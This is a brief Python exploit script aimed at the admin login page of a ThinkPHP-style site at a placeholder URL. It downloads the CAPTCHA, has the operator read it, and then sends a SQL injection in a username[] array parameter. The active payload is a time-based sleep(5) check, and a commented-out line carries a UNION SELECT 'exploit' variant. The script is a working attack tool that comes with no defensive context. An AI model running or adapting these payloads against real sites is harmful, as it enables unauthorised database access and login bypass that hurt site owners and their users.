import threading
import requests
import json
import urllib
import matplotlib.pyplot as plt

url = "http://www.xxx.com"
yzm = "/index.php?s=/Admin/Public/verify.html"
login = "/index.php?s=/Admin/Public/login.html"

s = requests.session()
yzm_img = s.get(url + yzm).content
print(s.cookies)
headers = {"X-Requested-With": "XMLHttpRequest"}

with open("yzm.png","wb") as f:
    f.write(yzm_img)

def show_yzm():
    yzm_img = plt.imread('yzm.png')
    plt.imshow(yzm_img)
    plt.show()

t = threading.Thread(target=show_yzm)
t.start()

yzm = input("输入看到的验证码：")

postdata = (
                #('username[]','like 1)and 1 in (2) union select 1,2,"",4,5,6,7,8,9,10,11#'),   #exploit
                ('username[]','like 1)and 1 in (2) or sleep(5)#'),                              #check
                ('username[]',0),
                ('password',''),
                ('verify',yzm)
            )

r = s.post(url + login,headers=headers,data=postdata)

print(r.text)
